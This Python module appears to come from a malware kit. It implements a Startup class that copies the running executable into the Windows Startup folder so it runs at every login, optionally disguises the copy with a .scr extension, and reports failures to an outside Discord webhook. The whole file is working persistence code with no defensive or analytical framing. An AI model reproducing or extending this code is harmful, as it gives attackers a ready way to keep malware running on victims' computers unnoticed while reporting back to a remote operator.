import os
import shutil
from dhooks import Embed
from config import Config
from __webhook import _WebhookX
from sys import argv

cc = Config()
eb_color = cc.get_color()

class Startup:
    def __init__(self, cc_instance):
        self.cc = cc_instance
        self.roaming = os.getenv("appdata")
        self.startup_loc = os.path.join(self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        self.file_path = os.path.abspath(argv[0])

    def send_error_notification(self, exception):
        webx = _WebhookX().get_object()

        embed = Embed(
            description='Error while copying to startup',
            color=self.cc.get_color(),
            timestamp='now'
        )

        embed.set_author(name=self.cc.get_name(), icon_url=self.cc.get_avatar())
        embed.set_footer(text=self.cc.get_footer(), icon_url=self.cc.get_avatar())
        embed.add_field(name="Couldn't copy to startup or rename to scr | Help us by reporting this bug",
                        value=f'Advanced Log: ```{exception}```')

        webx.send(embed=embed)

    def copy_to_startup(self):
        try:
            startup_file_path = os.path.join(self.startup_loc, os.path.basename(self.file_path))
            shutil.copy(self.file_path, startup_file_path)
            
            if cc.use_scr:
                new_startup_file_path = os.path.splitext(startup_file_path)[0] + ".scr"
                os.rename(startup_file_path, new_startup_file_path)
        except Exception as e:
            self.send_error_notification(e)
            
